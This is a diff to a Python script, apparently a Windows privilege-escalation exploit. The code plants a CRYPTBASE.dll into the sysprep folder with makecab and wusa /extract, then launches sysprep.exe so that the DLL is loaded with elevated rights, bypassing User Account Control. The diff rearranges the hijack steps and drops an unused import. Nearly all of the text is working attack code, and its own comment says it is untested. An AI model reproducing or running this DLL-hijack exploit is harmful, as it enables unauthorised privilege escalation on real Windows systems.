@@ -1,8 +1,8 @@
 """
 Under development, untested code but should work.
-
+	
 https://www.greyhathacker.net/?p=796
-
+	
 Executable:
 C:\windows\System32\sysprep\sysprep.exe
 
@@ -21,7 +21,6 @@ access
 """
 import os
 import sys
-import requests
 import win32api
 import win32con
 
@@ -40,25 +39,25 @@ def sysprep_dll_hijack(url):
 						except Exception as error:
 							return False
 					else:
-						return False
+						try:
+							makecab = os.popen("makecab CRYPTBASE.dll CRYPTBASE.tmp")
+						except Exception as error:
+							return False	
+						try:
+							wusa = os.popen("wusa CRYPTBASE.tmp /extract:c:\windows\system32\sysprep")
+						except Exception as error:
+							return False
+						try:
+							print os.remove("CRYPTBASE.tmp")
+						except Exception as error:
+							return False	
+						try:
+							win32api.ShellExecute(0,None,"c:\windows\system32\sysprep\sysprep.exe",None,None,win32con.SW_SHOW)
+						except Exception as error:
+							return False
 				else:
 					return False
 			except Exception as error:
-				try:
-					makecab = os.popen("makecab CRYPTBASE.dll CRYPTBASE.tmp")
-				except Exception as error:
-					return False	
-				try:
-					wusa = os.popen("wusa CRYPTBASE.tmp /extract:c:\windows\system32\sysprep")
-				except Exception as error:
-					return False
-				try:
-					print os.remove("CRYPTBASE.tmp")
-				except Exception as error:
-					return False	
-			try:
-				win32api.ShellExecute(0,None,"c:\windows\system32\sysprep\sysprep.exe",None,None,win32con.SW_SHOW)
-			except Exception as error:
-				return False
+
 	else:
 		sys.exit()		
